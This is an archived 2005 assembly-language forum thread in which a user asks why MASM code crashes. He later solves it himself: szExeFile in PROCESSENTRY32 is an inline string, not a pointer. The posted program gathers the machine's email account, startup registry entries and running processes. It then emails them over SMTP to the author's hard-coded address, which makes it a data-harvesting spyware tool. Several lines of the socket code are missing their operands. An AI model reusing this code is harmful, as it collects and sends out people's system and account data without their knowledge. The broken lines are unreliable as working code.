<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>Invalid Page Fault - need help - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=22261" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=22261">Invalid Page Fault - need help</a></p>
   <div class="post" id="post-167288">
    <div class="subject"><a href="#post-167288">Invalid Page Fault - need help</a></div>
    <div class="body">When my program runs the CompileProcessList proc in the source code posted below, it gives an Invalid Page Fault. Can&#39;t figure out why, though. Can anyone help? :)</div>
    <div class="meta">Posted on 2005-10-27 22:03:45 by programinator</div>
   </div>
   <div class="post" id="post-167290">
    <div class="subject"><a href="#post-167290">Re: Invalid Page Fault - need help</a></div>
    <div class="body">Post the snippet. As a rule of thumb, if want the majority of people who see your thread to help you find the bug, post the related snippet inside code tags. Do not expect people to bother themselves to download a ZIP, unzip it, look for the file, open the file, and look for the code.</div>
    <div class="meta">Posted on 2005-10-27 22:17:49 by comrade</div>
   </div>
   <div class="post" id="post-167291">
    <div class="subject"><a href="#post-167291">Re: Invalid Page Fault - need help</a></div>
    <div class="body">OK, here is the code:<br /><pre><code><br /><br />COMMENT *<br />© Copyright 2005, Jeremy M<br />programinator@gmail.com<br />*<br /><br />.386<br />.model flat, stdcall<br />option casemap:none<br /><br />incboth macro incl<br />	include E:\MASM32\INCLUDE\incl.inc<br />	includelib E:\MASM32\LIB\incl.lib<br />endm<br />include E:\MASM32\INCLUDE\windows.inc<br />incboth kernel32<br />incboth user32<br />incboth comctl32<br />incboth advapi32<br />incboth wsock32<br />incboth masm32<br /><br />addstr macro strng<br />	LOCAL nustr<br />	.data<br />	nustr db strng, 0<br />	.code<br />	exitm &lt;addr nustr&gt;<br />endm<br /><br />WinMain PROTO :DWORD, :DWORD, :DWORD, :DWORD<br />DlgProc PROTO :DWORD, :DWORD, :DWORD, :DWORD<br />CompileEmail PROTO<br />CompileEmailHeader PROTO<br />CompileStartupList PROTO<br />CompileProcessList PROTO<br />CompileEmailFooter PROTO<br />SendEmail PROTO<br /><br />.const<br />IDC_GO equ 10<br />IDC_EXIT equ 11<br />IDC_STATUS equ 12<br />IDC_PROG equ 13<br /><br />.data<br />AppName db &quot;ProjectDA&quot;, 0<br /><br />ServerName db &quot;pop.ihug.co.nz&quot;, 0<br /><br />MailFromRegKey db &quot;Software\Microsoft\Internet Account Manager\Accounts\00000001&quot;, 0<br />MailFromRegValue db &quot;SMTP Email Address&quot;, 0<br />MailFrom db &quot;MAIL FROM: &lt;%s&gt;&quot;, 13, 10, 0<br />RcptTo db &quot;RCPT TO: &lt;programinator@gmail.com&gt;&quot;, 13, 10, 0<br />Data db &quot;DATA&quot;, 13, 10, 0<br />Quit db &quot;QUIT&quot;, 13, 10, 0<br />EmailHeader db &#39;Date: %s, %d %s %d %02d:%02d:%02d GMT&#39;, 13, 10<br />            db &#39;From: &lt;%s&gt;&#39;, 13, 10<br />            db &#39;To: &lt;programinator@gmail.com&gt;&#39;, 13, 10<br />            db &#39;Subject: Auto data from ProjectDA&#39;, 13, 10<br />            db &#39;X-Mailer: ProjectDA&#39;, 13, 10<br />            db &#39;MIME-Version: 1.0&#39;, 13, 10<br />            db &#39;Content-Type: multipart/mixed; boundary=MAIL_Boundary12345&#39;, 13, 10<br />            db 13, 10<br />            db &#39;This is a multipart message in MIME format.&#39;, 13, 10<br />            db 13, 10<br />            db &#39;--MAIL_Boundary12345&#39;, 13, 10<br />            db &#39;Content-Type: text/html&#39;, 13, 10<br />            db 13, 10<br />            db &#39;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;&#39;, 13, 10<br />            db &#39;&lt;html&gt;&#39;, 13, 10<br />            db &#39;&lt;body&gt;&#39;, 13, 10, 0<br />EmailFooter db &#39;&lt;/body&gt;&#39;, 13, 10<br />            db &#39;&lt;/html&gt;&#39;, 13, 10<br />            db 13, 10<br />            db &#39;--MAIL_Boundary12345&#39;, 13, 10<br />            db &#39;.&#39;, 13, 10, 0<br />StartupListRegKey db &quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;, 0<br />StartupListHeader db &#39;&lt;table style=&quot;width: 100%; border: 1px dotted #007fff;&quot;&gt;&#39;, 13, 10<br />                  db &#39;&lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;&lt;b&gt;Startup List:&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10<br />                  db &#39;&lt;tr&gt; &lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt; &lt;td&gt;&lt;b&gt;File&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10, 0<br />StartupListFormat db &#39;&lt;tr&gt; &lt;td&gt;%s&lt;/td&gt; &lt;td&gt;%s&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10, 0<br />StartupListFooter db &#39;&lt;/table&gt;&#39;, 13, 10, 0<br />ProcessListHeader db &#39;&lt;table style=&quot;width: 100%; border: 1px dotted #ff7f00;&quot;&gt;&#39;, 13, 10<br />                  db &#39;&lt;tr&gt; &lt;td&gt;&lt;b&gt;Process List:&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10<br />                  db &#39;&lt;tr&gt; &lt;td&gt;&lt;b&gt;File&lt;/b&gt;&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10, 0<br />ProcessListFormat db &#39;&lt;tr&gt; &lt;td&gt;%s&lt;/td&gt; &lt;/tr&gt;&#39;, 13, 10, 0<br />ProcessListFooter db &#39;&lt;/table&gt;&#39;, 13, 10, 0<br />months db &quot;Jan&quot;, 0, &quot;Feb&quot;, 0, &quot;Mar&quot;, 0, &quot;Apr&quot;, 0, &quot;May&quot;, 0, &quot;Jun&quot;, 0<br />       db &quot;Jul&quot;, 0, &quot;Aug&quot;, 0, &quot;Sep&quot;, 0, &quot;Oct&quot;, 0, &quot;Nov&quot;, 0, &quot;Dec&quot;, 0<br />days db &quot;Sun&quot;, 0, &quot;Mon&quot;, 0, &quot;Tue&quot;, 0, &quot;Wed&quot;, 0<br />     db &quot;Thu&quot;, 0, &quot;Fri&quot;, 0, &quot;Sat&quot;, 0<br /><br />.data?<br />hInstance dd ?<br />CommandLine dd ?<br /><br />Buffer db 1024 dup (?)<br />Buffer2 db 1024 dup (?)<br />RegKeyBuffer db 512 dup (?)<br />RegValueBuffer db 256 dup (?)<br />MailFromBuffer db 256 dup (?)<br />BufferSize dd ?<br />LogFile db 10000 dup (?)<br />DayOfWeek dd ?<br />Day dd ?<br />Month dd ?<br />Year dd ?<br />Hours dd ?<br />Minutes dd ?<br />Seconds dd ?<br />hFrom dd ?<br />hRun dd ?<br />dwIndex dd ?<br />hProc dd ?<br />pe32 PROCESSENTRY32 &lt;?&gt;<br /><br />.code<br />start:<br />invoke GetModuleHandle, 0<br />mov hInstance, eax<br />invoke GetCommandLine<br />mov CommandLine, eax<br />invoke WinMain, hInstance, 0, eax, SW_SHOWDEFAULT<br />invoke ExitProcess, 0<br />invoke InitCommonControls<br /><br />WinMain proc hInst, hPrevInst, CmdLine, CmdShow<br />	<br />	invoke DialogBoxParam, hInst, 1, 0, ADDR DlgProc, 0<br />	ret<br /><br />WinMain endp<br /><br />DlgProc proc hDlg:HWND, iMsg:UINT, wParam:WPARAM, lParam:LPARAM<br />	<br />	LOCAL hProg:DWORD<br />	.if iMsg==WM_INITDIALOG<br />		invoke GetDlgItem, hDlg, IDC_PROG<br />		mov hProg, eax<br />		invoke SendMessage, hProg, PBM_SETBARCOLOR, 0, 0ff7f00h<br />	.elseif iMsg==WM_COMMAND<br />		mov eax, wParam<br />		mov edx, wParam<br />		shr edx, 16<br />		.if lParam!=0<br />		.if ax==IDC_GO<br />			.if dx==BN_CLICKED<br />				invoke CompileEmail<br />				;invoke SendEmail<br />				invoke MessageBox, hDlg, ADDR LogFile, ADDR AppName, 0<br />			.endif<br />		.elseif ax==IDC_EXIT<br />			.if dx==BN_CLICKED<br />				invoke DestroyWindow, hDlg<br />			.endif<br />		.endif<br />		.endif<br />	.elseif iMsg==WM_CLOSE<br />		invoke EndDialog, hDlg, 0<br />	.else<br />		xor eax, eax<br />		ret<br />	.endif<br />	mov eax, 1<br />	ret<br /><br />DlgProc endp<br /><br />COMMENT *<br />CompileAndSend proc<br />	<br />	invoke WSAStartup, 101h, ADDR wsadata<br />	invoke socket, AF_INET, SOCK_STREAM, 0<br />	mov hSock, eax<br />	mov sin.sin_family, AF_INET<br />	invoke htons, 25<br />	mov sin.sin_port, ax<br />	invoke gethostbyname, ADDR ServerName<br />	mov eax, <br />	mov eax, <br />	mov eax, <br />	mov sin.sin_addr, eax<br />	invoke connect, hSock, ADDR sin, SIZEOF sin<br />	invoke send, hSock, ADDR MailFrom, SIZEOF MailFrom-1, 0<br />	invoke recv, hSock, ADDR Buffer, 768, 0<br />	invoke send, hSock, ADDR RcptTo, SIZEOF RcptTo-1, 0<br />	invoke recv, hSock, ADDR Buffer, 768, 0<br />	invoke send, hSock, ADDR Data, SIZEOF Data-1, 0<br />	invoke recv, hSock, ADDR Buffer, 768, 0<br />	invoke lstrcpy, ADDR LogFile, ADDR EMailHeader<br />	invoke GetStartupList<br />	invoke lstrcat, ADDR LogFile, ADDR EMailFooter<br />	invoke lstrlen, ADDR LogFile<br />	invoke send, hSock, ADDR LogFile, eax, 0<br />	invoke recv, hSock, ADDR Buffer, 768, 0<br />	invoke send, hSock, ADDR Quit, SIZEOF Quit-1, 0<br />	invoke recv, hSock, ADDR Buffer, 768, 0<br />	invoke closesocket, hSock<br />	invoke WSACleanup<br />	ret<br /><br />CompileAndSend endp<br />*<br /><br />COMMENT *<br />GetStartupList proc<br />	<br />	invoke lstrcat, ADDR LogFile, ADDR LogStartupList<br />	invoke RegOpenKey, HKEY_LOCAL_MACHINE, addstr(&quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;), ADDR hRun<br />	invoke RegQueryInfoKey, hRun, 0, 0, 0, 0, 0, 0, ADDR NumValues, 0, 0, 0, 0<br />	mov eax, NumValues<br />	shl eax, 16<br />	invoke SendMessage, hProg, PBM_SETRANGE, 0, eax<br />	mov dwIndex, 0<br />	.while TRUE<br />		mov BufferSize, 256<br />		invoke RegEnumValue, hRun, dwIndex, ADDR Buffer, ADDR BufferSize, 0, 0, 0, 0<br />		.if eax==ERROR_SUCCESS<br />			mov BufferSize, 256<br />			invoke RegQueryValueEx, hRun, ADDR Buffer, 0, 0, ADDR Buffer2, ADDR BufferSize<br />			invoke wsprintf, ADDR Buffer3, ADDR LogStartupListFmt, ADDR Buffer, ADDR Buffer2<br />			invoke lstrcat, ADDR LogFile, ADDR Buffer3<br />		.else<br />			.break<br />		.endif<br />		inc dwIndex<br />		invoke SendMessage, hProg, PBM_STEPIT, 0, 0<br />	.endw<br />	invoke RegCloseKey, hRun<br />	ret<br /><br />GetStartupList endp<br />*<br /><br />CompileEmail proc<br />	<br />	invoke CompileEmailHeader<br />	invoke CompileStartupList<br />	invoke CompileProcessList<br />	invoke CompileEmailFooter<br />	ret<br /><br />CompileEmail endp<br /><br />CompileEmailHeader proc<br />	<br />	LOCAL systime:SYSTEMTIME<br />	invoke GetLocalTime, ADDR systime<br />	movzx eax, systime.wDayOfWeek<br />	shl eax, 2<br />	add eax, OFFSET days<br />	mov DayOfWeek, eax<br />	movzx eax, systime.wDay<br />	mov Day, eax<br />	movzx eax, systime.wMonth<br />	dec eax<br />	shl eax, 2<br />	add eax, OFFSET months<br />	mov Month, eax<br />	movzx eax, systime.wYear<br />	mov Year, eax<br />	movzx eax, systime.wHour<br />	mov Hours, eax<br />	movzx eax, systime.wMinute<br />	mov Minutes, eax<br />	movzx eax, systime.wSecond<br />	mov Seconds, eax<br />	invoke RegOpenKey, HKEY_CURRENT_USER, ADDR MailFromRegKey, ADDR hFrom<br />	mov BufferSize, 256<br />	invoke RegQueryValueEx, hFrom, ADDR MailFromRegValue, 0, 0, ADDR MailFromBuffer, ADDR BufferSize<br />	invoke RegCloseKey, hFrom<br />	invoke wsprintf, ADDR LogFile, ADDR EmailHeader, DayOfWeek, Day, Month, Year, Hours, Minutes, Seconds, ADDR MailFromBuffer<br />	ret<br /><br />CompileEmailHeader endp<br /><br />CompileStartupList proc<br />	<br />	invoke lstrcat, ADDR LogFile, ADDR StartupListHeader<br />	invoke RegOpenKey, HKEY_LOCAL_MACHINE, ADDR StartupListRegKey, ADDR hRun<br />	mov dwIndex, 0<br />	.while TRUE<br />		mov BufferSize, 512<br />		invoke RegEnumValue, hRun, dwIndex, ADDR RegKeyBuffer, ADDR BufferSize, 0, 0, 0, 0<br />		.if eax==ERROR_SUCCESS<br />		    mov BufferSize, 256<br />			invoke RegQueryValueEx, hRun, ADDR RegKeyBuffer, 0, 0, ADDR RegValueBuffer, ADDR BufferSize<br />			invoke wsprintf, ADDR Buffer, ADDR StartupListFormat, ADDR RegKeyBuffer, ADDR RegValueBuffer<br />			invoke lstrcat, ADDR LogFile, ADDR Buffer<br />		.else<br />			.break<br />		.endif<br />		inc dwIndex<br />	.endw<br />	invoke RegCloseKey, hRun<br />	invoke lstrcat, ADDR LogFile, ADDR StartupListFooter<br />	ret<br /><br />CompileStartupList endp<br /><br />CompileProcessList proc<br />	<br />	invoke lstrcat, ADDR LogFile, ADDR ProcessListHeader<br />	invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0<br />	mov hProc, eax<br />	mov pe32.dwSize, SIZEOF pe32<br />	invoke Process32First, hProc, ADDR pe32<br />	invoke wsprintf, ADDR Buffer, ADDR ProcessListFormat, pe32.szExeFile<br />	invoke lstrcat, ADDR LogFile, ADDR Buffer<br />	.while TRUE<br />		invoke Process32Next, hProc, ADDR pe32<br />		.if eax!=0<br />			invoke wsprintf, ADDR Buffer, ADDR ProcessListFormat, pe32.szExeFile<br />			invoke lstrcat, ADDR LogFile, ADDR Buffer<br />		.else<br />			.break<br />		.endif<br />	.endw<br />	invoke CloseHandle, hProc<br />	ret<br /><br />CompileProcessList endp<br /><br />CompileEmailFooter proc<br />	<br />	invoke lstrcat, ADDR LogFile, ADDR EmailFooter<br />	ret<br /><br />CompileEmailFooter endp<br /><br />SendEmail proc<br />	<br />	LOCAL wsadata:WSADATA<br />	LOCAL sin:sockaddr_in<br />	LOCAL hSock:DWORD<br />	invoke WSAStartup, 101h, ADDR wsadata<br />	invoke socket, AF_INET, SOCK_STREAM, 0<br />	mov hSock, eax<br />	mov sin.sin_family, AF_INET<br />	invoke htons, 25<br />	mov sin.sin_port, ax<br />	invoke gethostbyname, ADDR ServerName<br />	mov eax, <br />	mov eax, <br />	mov eax, <br />	mov sin.sin_addr, eax<br />	invoke connect, hSock, ADDR sin, SIZEOF sin<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke wsprintf, ADDR Buffer, ADDR MailFrom, ADDR MailFromBuffer<br />	invoke lstrlen, ADDR Buffer<br />	invoke send, hSock, ADDR Buffer, eax, 0<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke send, hSock, ADDR RcptTo, SIZEOF RcptTo-1, 0<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke send, hSock, ADDR Data, SIZEOF Data-1, 0<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke lstrlen, ADDR LogFile<br />	invoke send, hSock, ADDR LogFile, eax, 0<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke send, hSock, ADDR Quit, SIZEOF Quit-1, 0<br />	invoke recv, hSock, ADDR Buffer, 1024, 0<br />	invoke closesocket, hSock<br />	invoke WSACleanup<br />	ret<br /><br />SendEmail endp<br /><br />end start<br /><br /></code></pre><br /></div>
    <div class="meta">Posted on 2005-10-27 22:23:00 by programinator</div>
   </div>
   <div class="post" id="post-167297">
    <div class="subject"><a href="#post-167297">Re: Invalid Page Fault - need help</a></div>
    <div class="body">Nevermind, I just figured out the problem. In a PROCESSENTRY32 structure, szExeFile is a string, <em>not</em> a pointer to a string. That explains the Invalid Page Fault.</div>
    <div class="meta">Posted on 2005-10-28 03:38:25 by programinator</div>
   </div>
  </div>
 </body>
</html>